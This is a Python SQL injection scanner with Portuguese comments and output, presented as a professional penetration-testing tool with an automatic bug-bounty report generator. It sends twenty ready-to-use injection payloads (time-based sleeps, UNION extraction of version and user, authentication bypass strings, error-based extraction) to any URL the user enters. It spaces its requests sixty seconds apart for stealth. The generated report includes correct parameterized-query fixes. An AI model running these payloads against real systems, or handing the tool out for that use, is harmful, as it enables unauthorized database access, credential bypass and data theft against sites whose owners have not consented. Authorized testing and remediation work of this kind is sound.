import requests
import time
import os
from datetime import datetime

def gerar_relatorio_tecnico(alvo, payload, tipo_sqli, duracao=None):
    """Gera um arquivo .md formatado para submissão em plataformas de Bug Bounty com remediação por linguagem."""
    data_atual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    nome_arquivo = f"Report_SQLi_{int(time.time())}.md"
    
    # Dicionário de Correções Técnicas
    remediacoes = {
        "PHP": "```php\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);\n```",
        "Python": "```python\n# Usando Psycopg2 ou similares\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n```",
        "Node.js": "```javascript\n// Usando mysql2 ou pg\nconnection.query('SELECT * FROM users WHERE id = ?', [userId]);\n```",
        "Java": "```java\nPreparedStatement pstmt = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\npstmt.setString(1, userId);\n```"
    }

    if "Time-Based" in tipo_sqli:
        impacto = f"O servidor executou o comando SLEEP por {duracao:.2f} segundos, confirmando execução de comandos SQL arbitrários via timing attack."
    else:
        impacto = "O payload permitiu a extração de metadados internos (versão/usuário) do banco de dados."

    conteudo = f"""# Relatório de Vulnerabilidade: {tipo_sqli}

## 🛡️ Resumo
Vulnerabilidade de SQL Injection confirmada. O parâmetro de entrada não é devidamente sanitizado, permitindo manipulação da query original e execução de comandos não autorizados no banco de dados.

**Alvo:** {alvo}
**Data do Teste:** {data_atual}
**Payload Utilizado:** `{payload}`
**Impacto:** {impacto}

## 🛠️ Remediação Técnica
A melhor prática para prevenir SQL Injection é o uso de **Prepared Statements** (Consultas Parametrizadas). Isso garante que o banco de dados trate o input do usuário estritamente como dado, e não como parte do comando executável.

### Exemplos de Implementação Correta:

#### PHP (PDO)
{remediacoes['PHP']}

#### Python
{remediacoes['Python']}

#### Node.js
{remediacoes['Node.js']}

#### Java (JDBC)
{remediacoes['Java']}

---
*Gerado automaticamente por SQLi Furtivo Scanner.*
"""
    with open(nome_arquivo, "w", encoding="utf-8") as f:
        f.write(conteudo)
    
    print(f"\n[+] Relatório detalhado gerado: {nome_arquivo}")
    return nome_arquivo

# --- A LINHA ABAIXO ESTAVA FALTANDO NO SEU CÓDIGO ---
def sqli_scanner_furtivo():
    print("""
============================================================
       SQLi FURTIVO - Teste de invasao profissional 
        Desenvolvido por Willian de Oliveira 
       Certificado em Ciberseguranca Essencial pela IBSEC
============================================================
    """)
    
    target = input("🎯 URL Alvo: ")
    
    # OS 20 PAYLOADS DE ALTA PERFORMANCE
    payloads = [
        # Time-Based
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--", 
        "1\" AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--",
        "(select(0)from(select(sleep(10)))v)",
        "'; WAITFOR DELAY '0:0:10'--",
        "1' AND 4444=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",
        # Union-Based
        "' UNION SELECT NULL, @@version, user(), database()--",
        "\" UNION SELECT NULL, @@version, user(), database()--",
        "1' UNION SELECT 1,2,3,4,5,6--",
        "' UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL--",
        "1 UNION ALL SELECT (SELECT concat(0x71,user(),0x71)),NULL--",
        # Auth Bypass
        "admin'--",
        "admin' #",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "admin' or '1'='1'--",
        # Error/Boolean Based
        "1' AND extractvalue(1,concat(0x7e,(select @@version),0x7e))--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' HAVING 1=1--",
        "1' GROUP BY 1,2,3--"
    ]

    for i, p in enumerate(payloads):
        print(f"[*] [{i+1}/20] Testando payload: {p}")
        try:
            start = time.time()
            res = requests.get(target, params={"id": p}, timeout=25)
            duracao = time.time() - start
            
            # Detecção Time-Based
            if duracao >= 9:
                print(f"💰 SUCESSO! Vulnerabilidade confirmada via Tempo.")
                gerar_relatorio_tecnico(target, p, "SQL Injection (Time-Based)", duracao)
                break

            # Detecção de Dados/Erro
            detectores = ["mysql", "mariadb", "postgresql", "sqlite", "version", "system_user"]
            if any(d in res.text.lower() for d in detectores):
                print(f"💰 SUCESSO! Vulnerabilidade confirmada via Extração.")
                gerar_relatorio_tecnico(target, p, "SQL Injection (Extraction)")
                break

        except:
            print("⚠️ Erro de conexão ou timeout (pode ser um indício).")

        if i < len(payloads) - 1:
            print("⏳ Aguardando 60 segundos para o próximo teste (Furtividade)...")
            time.sleep(60)

if __name__ == "__main__":
    sqli_scanner_furtivo()
